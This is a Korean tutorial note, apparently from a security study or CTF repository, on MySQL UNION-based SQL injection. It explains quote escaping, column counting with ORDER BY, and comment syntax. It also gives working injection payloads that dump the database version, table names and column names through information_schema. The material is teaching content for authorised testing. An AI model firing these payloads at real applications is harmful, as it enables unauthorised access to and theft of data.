# MySQL UNION SQLi 기본

## 개요

UNION 기반 SQLi는 세 가지가 한 세트다.

| 구성 요소 | 역할 |
|---|---|
| `'` | 열려 있는 문자열을 일찍 닫아 SQL 문법 영역으로 탈출 |
| `ORDER BY n` | 결과 컬럼 수 탐침 |
| `-- -` | 원래 쿼리의 남은 부분 주석 처리 |

## 인젝션 포인트와 문자열 탈출

서버 쿼리가 입력을 문자열 안에 그대로 붙이는 지점이 인젝션 포인트다.

```php
$sql = "SELECT * FROM employees
        WHERE first_name LIKE '%$first_name%' AND last_name LIKE '%$last_name%'";
```

입력은 이미 따옴표로 감싸인 문자열 안쪽에 들어간다. 그래서 `'`는 새 문자열을 여는 게 아니라 열려 있는 문자열을 일찍 닫는 동작이다.

`first_name`에 `' ORDER BY 5-- -`를 넣으면 쿼리가 이렇게 조립된다.

```sql
SELECT * FROM employees WHERE first_name LIKE '%' ORDER BY 5-- -%' AND last_name LIKE '%%'
```

| 조각 | 해석 |
|---|---|
| `LIKE '%'` | 입력의 `'`가 문자열을 닫음. 조건 하나 완성 |
| `ORDER BY 5` | 문자열이 끝났으므로 이후 입력이 SQL 문법으로 해석됨 |
| `-- -` | 개발자가 붙인 원래 잔여부 `%' AND ...`를 버림 |

뒤에 `'`를 또 붙이면 안 닫힌 따옴표가 하나 더 생겨 문법 에러가 난다. 닫을 문자열을 우리가 여는 게 아니라 이미 열린 것을 닫는 것이므로 앞에만 붙인다.

## 컬럼 수 탐침: ORDER BY n

`ORDER BY n`은 n번째 컬럼 기준 정렬이고, n번째 컬럼이 없으면 MySQL이 에러를 낸다. 이를 개수 탐침으로 쓴다.

| 입력 | 쿼리 결과 | 화면 관찰 |
|---|---|---|
| `' ORDER BY 4-- -` | 4컬럼 존재, 정상 | 정렬된 목록 출력 |
| `' ORDER BY 5-- -` | 5번째 컬럼 없음, 에러 | 결과 0건 |

UNION SELECT는 앞 SELECT와 컬럼 수가 같아야만 작동하므로 이 값이 먼저 필요하다.

```sql
-- 컬럼 수 일치 실패 예
SELECT a,b,c,d FROM employees UNION SELECT 1,2,3     -- 에러
SELECT a,b,c,d FROM employees UNION SELECT 1,2,3,4   -- 성공
```

## UNION SELECT로 데이터 추출

```sql
-- 어느 자리가 화면에 출력되는지 확인
' UNION SELECT 'A','B','C','D'-- -

-- DB 지문
' UNION SELECT version(),database(),user(),'D'-- -

-- 테이블 목록(출력 행 수 제한 대비 GROUP_CONCAT)
' UNION SELECT GROUP_CONCAT(table_name),2,3,4 FROM information_schema.tables WHERE table_schema=database()-- -

-- 컬럼 목록
' UNION SELECT GROUP_CONCAT(column_name),2,3,4 FROM information_schema.columns WHERE table_name='users'-- -
```

URL로 보낼 때는 공백을 `+`, `'`를 `%27`, `,`를 `%2C`로 인코딩한다. (쿼리스트링 기준. 경로에는 `+`가 리터럴로 전달되므로 `%20`을 쓴다.)

## 주석: 왜 `-- -` 형태인가

MySQL에서 `--`는 뒤에 공백(또는 제어 문자)이 있어야만 주석으로 인정된다.

```sql
SELECT 10-- 1   -- 주석. 10 출력
SELECT 10--1    -- 주석 아님. 10 - (-1) = 11 로 해석
```

`price--price` 같은 이중 음수 연산과의 충돌을 막으려는 MySQL 설계다. 오라클·MSSQL은 이런 제약이 없어 `--`만으로 주석이다.

한편 URL에서는 주석이 입력 끝에 오면 공백이 마지막 글자가 되는데, 끝 공백은 브라우저·서버·복붙 과정에서 잘려나가기 쉽다. 공백이 사라지면 `--`만 남아 이중 음수로 해석되고 쿼리가 깨진다. 그래서 공백 뒤에 유실돼도 무해한 글자를 붙여 공백이 끝에 오지 않게 고정한다.

```
-- -  =  "--"(주석 시작) + " "(MySQL 필수 공백) + "-"(공백 보호용 더미, 주석 내용일 뿐)
```

| 표기 | 의미 |
|---|---|
| `-- -` | 공백 보호용 더미 `-`를 붙인 가장 흔한 형태 |
| `--+` | URL에서 `+`는 공백으로 디코딩되므로 `-- `와 동일 |
| `--%20` | 공백을 명시적으로 인코딩 |
| `%23` | MySQL `#` 주석. 공백 불필요하나 URL fragment 충돌 때문에 인코딩 필요 |

## 주의

- 모든 시도는 허가된 대상에서만 실행한다.
- 실전 적용 사례: [Robust 롸잇업](../../../../Robust/README.md)
